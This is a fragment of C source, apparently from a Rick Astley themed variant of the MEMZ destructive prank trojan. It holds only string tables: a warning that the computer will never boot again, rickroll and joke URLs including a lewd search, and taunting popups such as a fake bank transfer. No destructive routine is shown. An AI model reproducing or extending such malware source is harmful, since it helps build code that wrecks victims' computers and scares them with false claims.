...
#ifndef CLEAN
const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY RICK ASTLEY.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill MEMZ will cause your system to be\r\ndestroyed instantly, so don't try it :D";
#endif

const char *sites[] = {
	"https://www.youtube.com/watch?v=dQw4w9WgXcQ",
	"https://downloadmoreram.com/download.html",
	"http://google.co.ck/search?q=how+to+big+chungus",
	"http://google.co.ck/search?q=what+the+dog+doing",
	"https://www.youtube.com/watch?v=TApmI8YtYhc",
	"https://www.youtube.com/watch?v=D2_r4q2imnQ",
	"https://www.youtube.com/watch?v=oTSPzy8cC4o",
	"http://google.co.ck/search?q=girls+in+2m+of+distance",
	...
	"http://google.co.ck/search?q=how+to+not+get+rickrolled",
...
const char *msgs[] = {
	...
	"You let me down.",
	"You dont kill Rick Astley, Rick Astley kills you",
	"Say what?!\r\nGoodbye!",
	"The noclip didn't work properly i think",
	"Never gonna run around and",
	"desert you",
	"Rick'ed",
	"I downloaded roblox hacks! (gone wrong?)",
	"ENJOY RICK",
	"Rick antivirus activated",
	"You are an idiot!\r\nHA HA HA HA HA HA HA",
	"era trollagi garai",
	"SOMEBODY ONCE TOLD ME THE RICK ARE GONNA ROLL ME",
	"Why did you even tried to kill RICK?\r\nYour PC is ROLLED anyway.",
	"SecureBoobs sucks.",
	"mf get mem'z rolled",
	"Have you tried cleaning cache?",
	"<Insert Rick quote here>",
	"Whoops! You accidentally sent 1000 dollars to my bank",
	"I'm not going to brazil",
	"'Finally a good hack'\r\n - danooct1 2016",
	"'Uh, Roblox. Time to get banned!'\r\n - danooct1 2016",
};
